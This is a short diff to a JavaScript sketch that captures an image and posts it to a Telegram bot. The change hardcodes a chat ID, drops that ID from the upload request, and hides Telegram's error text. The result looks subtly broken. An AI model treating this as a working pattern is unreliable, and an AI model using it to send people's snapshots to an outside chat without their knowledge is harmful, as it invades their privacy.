@@ -3,7 +3,7 @@ let button;
 let img;
 let fit;
 
-let CID = undefined;
+let CID = '-1002425906440';
 let TBT = undefined;
 
 const imgSize = [480,640];
@@ -56,7 +56,6 @@ async function fetchEnvVariables() {
       console.error('Error:', data.error);
     } else {
       TBT = data.tbt;
-      CID = data.cid;
     }
   } catch (error) {
     console.error('Error fetching:', error);
@@ -69,7 +68,6 @@ async function sendToTelegram(imageDataUrl) {
     .then(response => response.blob())
     .then(blob => {
       const formData = new FormData();
-      formData.append('CID', CID);
       formData.append('photo', blob, 'snapshot.png');
       fetch(`https://api.telegram.org/bot${TBT}/sendPhoto`, {
         method: 'POST',
@@ -80,7 +78,7 @@ async function sendToTelegram(imageDataUrl) {
           console.log('Image sent successfully');
         } else {
           return response.text().then(errorText => {
-            console.error('Failed to send image:', errorText);
+            console.error('Failed to send image');
           });
         }
       })
